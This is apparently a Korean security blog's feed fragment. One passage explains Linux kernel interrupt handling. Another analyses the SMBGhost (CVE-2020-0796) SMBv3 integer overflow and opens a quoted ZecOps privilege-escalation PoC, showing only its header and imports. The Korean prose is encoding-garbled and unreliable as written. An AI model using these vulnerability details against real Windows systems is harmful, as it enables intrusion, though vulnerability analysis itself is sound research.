	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irq_desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;cm&quot;&gt;/* high bit used in ret_from_ code  */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;orig_ax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;entering_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* entering_irq() tells RCU that we're not quiescent.  Check it. */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;RCU_LOCKDEP_WARN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcu_is_watching&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;IRQ failed to wake up RCU&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__this_cpu_read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;likely&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IS_ERR_OR_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IS_ENABLED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CONFIG_X86_32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;handle_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;generic_handle_irq_desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ack_APIC_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VECTOR_UNUSED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;pr_emerg_ratelimited&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s: %d.%d No irq handler for vector&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
					     &lt;span class=&quot;n&quot;&gt;__func__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smp_processor_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
					     &lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;__this_cpu_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;VECTOR_UNUSED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;exiting_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;set_irq_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/arch/arm/kernel/irq.c&lt;/code&gt;ì— ì¸í„°ëŸ½íŠ¸ ë²¡í„° í…Œì´ë¸”ì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;irq&lt;/code&gt;í•¸ë“¤ëŸ¬ê°€ ìˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_regs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;set_irq_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì²«ì¶œì˜ ì½”ë“œë¡œ í˜„ì¬ ë ˆì§€ìŠ¤í„°ë¥¼ ì €ì¥í•˜ê³ ,&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;set_irq_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;old_regs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë§ˆì§€ë§‰ì— ë‹¤ì‹œ ì›ë˜ í”„ë¡œì„¸ìŠ¤ë¡œ ëŒì•„ê°„ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pt_regs&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/*
 * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
 * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.
 */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* These regs are callee-clobbered. Always saved on kernel entry. */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/*
 * On syscall entry, this is syscall#. On CPU exception, this is error code.
 * On hw interrupt, it's IRQ number:
 */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;orig_rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* Return frame for iretq */&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eflags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ss&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cm&quot;&gt;/* top of stack page */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë ˆì§€ìŠ¤í„° êµ¬ì¡°ì²´ë¥¼ ë³´ë©´ ì§„ì§œ ê·¸ëƒ¥ ë ˆì§€ìŠ¤í„°ë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;gic_handle_shared_int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;chained&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;intr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;virq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pcpu_mask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;DECLARE_BITMAP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pending&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GIC_MAX_INTRS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chained&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;generic_handle_irq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;virq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;do_IRQ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;virq&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì‚¬ìš©ì˜ˆì‹œì´ë‹¤. í•˜ë“œì›¨ì–´ì—ì„œ ì¸í„°ëŸ½íŠ¸ê°€ ë°œìƒí•˜ë©´ &lt;code class=&quot;highlighter-rouge&quot;&gt;irq desc&lt;/code&gt;ë¥¼ ì°¸ì¡°í•´ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì— ì‘ì„±ëœ ì¸í„°ëŸ½íŠ¸ í•¸ë“¤ëŸ¬ë¥¼ ì‹¤í–‰í•œë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;ì „ì²´-íë¦„&quot;&gt;ì „ì²´ íë¦„&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/acaa16ca-36b1-4732-99b9-e88e160356ac/9c59d286-b683-4819-b0a0-efd32e819f46.png&quot; alt=&quot;/assets/acaa16ca-36b1-4732-99b9-e88e160356ac/9c59d286-b683-4819-b0a0-efd32e819f46.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì•„í‚¤í…ì²˜ë³„ë¡œ êµ¬í˜„ì´ ë‹¤ë¥´ë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Apr 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-04-01/hw-interrupt</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-01/hw-interrupt</guid>
        
        <category>research</category>
        
        
      </item>
    
      <item>
        <title>SMBGhost</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ë™ë¯¼&lt;/p&gt;

&lt;h2 id=&quot;ì†Œê°œ&quot;&gt;ì†Œê°œ&lt;/h2&gt;

&lt;p&gt;SMBGhost : CVE-2020-0796&lt;/p&gt;

&lt;p&gt;í˜„ì¬ ê³µê°œëœ RCE PoCëŠ” ì—†ìŒ, ê·¸ëŸ¬ë‚˜ LPE PoC ëŠ” ìˆìŒ
-&amp;gt; RCEê°€ ê³µê°œ ë  ê²½ìš°, ìŠ¤í¬ë¦½íŠ¸ í‚¤ë””ë‚˜ ì‚¬ì´ë²„ ë²”ì£„ìë¡œë¶€í„° ì‚¬íšŒì  íŒŒê¸‰ë ¥ì„ ê³ ë ¤í•˜ì—¬ ê³µê°œí•˜ì§€ ì•Šê¸°ë¡œ ê²°ì •. (ì•½ 48000ëŒ€ì˜ PC ë…¸ì¶œ)&lt;/p&gt;

&lt;p&gt;ì˜í–¥ë„ : Windows 10, server 2016 (v1903 ë° v1909)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/ca8b0633-25c0-4775-b98d-abaa573a80aa/23409f90-577a-4c9b-8c5c-ac109e5b854e.png&quot; alt=&quot;/assets/ca8b0633-25c0-4775-b98d-abaa573a80aa/23409f90-577a-4c9b-8c5c-ac109e5b854e.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Kryptos Logicì˜ Marcus Hutchins ì—°êµ¬ì›ì´ ì—¬ëŸ¬ PoCë¥¼ ê³µê°œí•¨.&lt;/p&gt;

&lt;p&gt;ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìê°€ íŠ¹ìˆ˜í•˜ê²Œ ì¡°ì‘ëœ íŒ¨í‚·ì„ êµ¬ì„±í•´ SMBv3 ì„œë²„ë¡œ ìš”ì²­.
Windows 10 ë²„ì „ 1903ì— ì¶”ê°€ ëœ ìƒˆë¡œìš´ ê¸°ëŠ¥(SMBv3 - ì••ì¶•)&lt;/p&gt;

&lt;h2 id=&quot;ë°°ê²½ì§€ì‹&quot;&gt;ë°°ê²½ì§€ì‹&lt;/h2&gt;

&lt;p&gt;SMBv3 ë¶€í„° ìƒˆë¡œ ì¶”ê°€ëœ ì••ì¶• ë° í•´ì œ ê´€ë ¨ êµ¬ì¡°ì²´&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2e230da0-a66b-415f-a56c-a4ce0f1f2310/a1b26d28-8f7b-4262-9d28-3905ee6fcb7d.png&quot; alt=&quot;/assets/2e230da0-a66b-415f-a56c-a4ce0f1f2310/a1b26d28-8f7b-4262-9d28-3905ee6fcb7d.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ë²„ê·¸&quot;&gt;ë²„ê·¸&lt;/h2&gt;

&lt;p&gt;bug : srv2.sys!Srv2DecompressData - Integer Overflow
SMB2_Compression_Transform_Header ì—ì„œ OriginalSize, Offset ì¡°ì‘í•˜ì—¬ Integer Overflow ë°œìƒ&lt;/p&gt;

&lt;p&gt;ë°œìƒìœ„ì¹˜ : add ecx, eax ; OriginalSize + Offset (in srv2.sys!Srv2DecompressData)
ì´í›„ ê³„ì‚°ëœ (ì¡°ì‘ëœ)ë²„í¼í¬ê¸°ë¥¼ SrvNetAllocateBuffer í•¨ìˆ˜ë¡œ ì „ë‹¬í•˜ì—¬ ë²„í¼ë¥¼ í• ë‹¹.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/43890ef7-d6a0-404b-87e8-8e6dedd43a2d/cae33f4b-81e9-46a1-8c9d-b10847bef027.png&quot; alt=&quot;/assets/43890ef7-d6a0-404b-87e8-8e6dedd43a2d/cae33f4b-81e9-46a1-8c9d-b10847bef027.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RtlDecompressBufferXpressLz í•¨ìˆ˜ë¥¼ í†µí•´ ì˜¤ë²„í”Œë¡œìš°ëœ ë°ì´í„°ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŒ.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/c84373bd-ff68-452a-965a-889380182a46/136ad7b6-6a43-4be1-9199-442e16ee7c26.png&quot; alt=&quot;/assets/c84373bd-ff68-452a-965a-889380182a46/136ad7b6-6a43-4be1-9199-442e16ee7c26.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wireshark íŒ¨í‚· ìº¡ì²˜ (4294967295 â†’ 0xffffffff)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/e023ce58-1b21-4137-82fc-efb2246350fc/ed07a9d0-665a-4966-b3ab-c7118898723f.png&quot; alt=&quot;/assets/e023ce58-1b21-4137-82fc-efb2246350fc/ed07a9d0-665a-4966-b3ab-c7118898723f.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;call stack&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ffff9480`20e2ad98  nt!RtlDecompressBufferXpressLz+0x2d0
ffff9480`20e2adb0  nt!RtlDecompressBufferEx2+0x66
ffff9480`20e2ae00  srvnet!SmbCompressionDecompress+0xd8
ffff9480`20e2ae70  srv2!Srv2DecompressData+0xdc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;-&amp;gt; nt!RtlDecompressBufferXpressLz í•¨ìˆ˜ì—ì„œ ë²„í¼ í• ë‹¹ì„ í•˜ë©° ìµœì¢…ì ìœ¼ë¡œ Integer Overflow ì—ì„œ Buffer Overflow ë¡œ ë°œì „.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/92494741-0475-46e7-ae99-94d8c6f50187/95b8d163-d7a5-4b44-aebc-c3330f141735.png&quot; alt=&quot;/assets/92494741-0475-46e7-ae99-94d8c6f50187/95b8d163-d7a5-4b44-aebc-c3330f141735.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/7e2fdcfc-1e14-48bf-8281-02b690c663b0/f6cf5ff3-1f03-4233-a02f-333bc0da6ab8.png&quot; alt=&quot;/assets/7e2fdcfc-1e14-48bf-8281-02b690c663b0/f6cf5ff3-1f03-4233-a02f-333bc0da6ab8.png&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/5520bbff-5dec-4aed-89b1-8b423c2c06ad/d92bc102-b9b1-4951-9a27-0a00de7ec043.png&quot; alt=&quot;/assets/5520bbff-5dec-4aed-89b1-8b423c2c06ad/d92bc102-b9b1-4951-9a27-0a00de7ec043.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2020-0796 Local Privilege Escalation POC
# (c) 2020 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
# Intended only for educational and testing in corporate environments.
# ZecOps takes no responsibility for the code, use at your own risk.
# Based on the work of Alexandre Beaulieu:
# https://gist.github.com/alxbl/2fb9a0583c5b88db2b4d1a7f2ca5cdda
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;subprocess&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pathlib&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;write_what_where&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;write_what_where&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ctypes&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
